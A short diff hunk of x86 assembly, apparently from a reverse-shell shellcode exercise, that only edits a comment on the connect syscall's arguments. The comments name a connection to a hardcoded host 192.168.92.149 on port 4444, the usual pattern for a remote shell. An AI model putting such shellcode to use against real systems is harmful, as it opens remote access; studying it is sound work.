@@ -32,7 +32,7 @@ _start:
 
 	; connect
 	; int connect(int sockfd, const struct sockaddr *addr, socklen_t addrlen)
-	; sockfd = esi, ecx, 16 bits (push 0x10)
+	; sockfd = esi, ecx, socklen = 16 bits (push 0x10)
 	; (AF_INET=2, sin_port=4444, INADDR_ANY=192.168.92.149) -> ecx pints to args 
 
 	xor eax, eax
